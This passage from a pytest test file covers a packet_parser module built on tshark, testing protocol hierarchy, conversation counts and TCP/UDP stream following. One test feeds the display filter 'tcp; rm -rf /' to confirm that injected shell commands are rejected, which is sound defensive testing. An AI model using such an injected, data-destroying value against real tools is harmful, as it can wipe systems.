    tree = await packet_parser.get_protocol_hierarchy(
        BytesSource(_http_exchange_pcap()), display_filter="udp",
    )
    assert [n.name for n in tree] == ["eth"]
    assert tree[0].frames == 1


async def test_protocol_hierarchy_rejects_hostile_filter_before_running_any_tool():
    with pytest.raises(ValueError):
        await packet_parser.get_protocol_hierarchy(BoomSource(), display_filter="tcp; rm -rf /")


@needs_tshark
async def test_conversations_splits_bytes_by_direction_not_by_who_is_a():
    convs, endpoints = await packet_parser.get_conversations(BytesSource(_http_exchange_pcap()))
    by_pair = {frozenset((c.a, c.b)): c for c in convs}
    ab = by_pair[frozenset(("10.0.0.1", "10.0.0.2"))]
    # 4 frames from .1 (SYN, ACK, GET, final ACK), 3 from .2 (SYN-ACK, ACK, response).
    a_to_b = ab.packets_a_to_b if ab.a == "10.0.0.1" else ab.packets_b_to_a
    b_to_a = ab.packets_b_to_a if ab.a == "10.0.0.1" else ab.packets_a_to_b
    assert (a_to_b, b_to_a) == (4, 3)

    ac = by_pair[frozenset(("10.0.0.1", "10.0.0.3"))]
    assert ac.packets_a_to_b + ac.packets_b_to_a == 1

    by_addr = {e.address: e for e in endpoints}
    assert by_addr["10.0.0.1"].packets == 8
    assert by_addr["10.0.0.2"].packets == 7
    assert by_addr["10.0.0.3"].packets == 1


@needs_tshark
async def test_follow_tcp_stream_reassembles_both_directions_in_order():
    result = await packet_parser.get_follow_stream(BytesSource(_http_exchange_pcap()), "tcp", 0)
    assert result.a == "10.0.0.1:12345"
    assert result.b == "10.0.0.2:80"
    directions = [(seg.from_a, bytes.fromhex(seg.hex)) for seg in result.segments]
    assert directions == [
        (True, b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"),
        (False, b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello"),
    ]


@needs_tshark
async def test_follow_udp_stream_works_too():
    result = await packet_parser.get_follow_stream(BytesSource(_http_exchange_pcap()), "udp", 0)
    assert result.a == "10.0.0.1:5353"
    assert result.segments[0].hex == b"dns-ish".hex()


@needs_tshark
async def test_following_a_stream_that_does_not_exist_raises():
    with pytest.raises(ValueError):
        await packet_parser.get_follow_stream(BytesSource(_http_exchange_pcap()), "tcp", 99)


@needs_tshark
async def test_packet_detail_carries_its_tcp_stream_index():
    detail = await packet_parser.get_packet_detail(BytesSource(_http_exchange_pcap()), 4)
    assert detail.tcp_stream == 0
    assert detail.udp_stream is None


@needs_tshark
async def test_packet_detail_carries_its_udp_stream_index():
    detail = await packet_parser.get_packet_detail(BytesSource(_http_exchange_pcap()), 8)
    assert detail.udp_stream == 0
    assert detail.tcp_stream is None


@needs_tshark
async def test_packet_list_carries_the_tcp_stream_index_per_row():
    """What the row's own right-click menu needs to offer Follow Stream
    without opening the detail pane first."""
    packets = await packet_parser.get_packet_list(BytesSource(_http_exchange_pcap()))
    assert [p.tcp_stream for p in packets[:7]] == [0] * 7
    assert packets[7].tcp_stream is None
    assert packets[7].udp_stream == 0
    assert all(p.udp_stream is None for p in packets[:7])
